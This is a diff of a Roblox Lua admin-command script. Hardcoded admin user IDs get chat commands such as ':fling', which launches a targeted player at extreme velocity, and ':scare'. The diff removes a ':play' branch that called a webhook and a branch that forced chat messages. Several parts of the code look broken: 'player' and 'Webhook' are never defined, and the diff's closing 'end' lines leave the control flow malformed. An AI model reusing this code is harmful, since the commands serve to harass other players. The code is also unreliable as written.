@@ -9,14 +9,13 @@ local Admins = {
     3242239583,---twpiii
     1751254477,---migsu
     1617667114,---ela
-    
 }
 
 local function commands(msg, plr)
     if table.find(Admins, plr) then
         local Mod = game:GetService("Players"):GetPlayerByUserId(plr)
         local Msg = string.lower(msg)
-        local SplitCMD = string.split(Msg, "")
+        local SplitCMD = string.split(Msg, ".")
         local Lower = string.lower(player.Name)
         local Allowed = string.find(Lower, SplitCMD[2])
         if Allowed then
@@ -40,16 +39,6 @@ local function commands(msg, plr)
         end
             if string.find(SplitCMD[1], ":fling") then
                 player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
-            end
-            if string.find(SplitCMD[1], ":play") then
-                local Glide = Instance.new("Animation", game.Workspace)
-                Glide.AnimationId = "rbxassetid://6507976593"
-
-                local Glide = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(Glide)
-
-                Glide:Play()
-
-                Webhook(player, "User Banned!")
             end
             if string.find(SplitCMD[1], ":scare") then
                 function Scare()
@@ -99,12 +88,8 @@ local function commands(msg, plr)
                     end
                 end
             end
-        else
-            if string.find(msg, "/e test") then
-                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", "All")
-            end
-        end
-    end
+end
+end
 end
 
 Players.PlayerAdded:Connect(
